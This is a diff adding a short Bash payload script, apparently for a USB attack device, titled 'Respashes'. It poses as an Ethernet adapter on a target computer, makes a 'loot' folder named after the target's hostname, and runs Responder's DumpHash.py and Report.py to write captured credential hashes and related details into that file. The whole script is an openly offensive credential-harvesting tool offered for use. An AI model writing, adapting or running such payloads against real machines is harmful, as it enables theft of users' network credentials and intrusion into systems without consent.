@@ -1,0 +1,39 @@
+#!/bin/bash
+#
+# Title: Respashes (Responder + Hashes)
+# Author: kuyaya
+# Version: 1.0
+
+# Swap to ECM_ETHERNET for Mac/Linux
+ATTACKMODE RNDIS_ETHERNET
+#ATTACKMODE ECM_ETHERNET
+
+# Check readiness & prepare environment
+LED SETUP
+REQUIRETOOL responder
+mount /dev/nandf /root/udisk
+
+# Create loot directory
+mkdir /root/udisk/loot/Respashes
+
+# Setup
+GET TARGET_HOSTNAME
+# Attack
+LED ATTACK
+
+# Clarification that the output below is from DumpHash.py
+echo '####-DumpHash.py-####' >> "/root/udisk/loot/Respashes/$TARGET_HOSTNAME.txt"
+
+# Runs "DumpHash.py" and saves results in a lootfile
+cd /tools/responder
+python DumpHash.py >> /root/udisk/loot/Respashes/$TARGET_HOSTNAME.txt
+
+# Clarification that the output below is from Report.py
+echo '####-Report.py-####' >> /root/udisk/loot/Respashes/$TARGET_HOSTNAME.txt
+
+# Runs "Report.py" and saves results in the same lootfile.
+# Note: Report.py is not necesarry for the hashes. It just gives you some extra information.
+python Report.py >> /root/udisk/loot/Respashes/$TARGET_HOSTNAME.txt
+
+# Finish
+LED FINISH
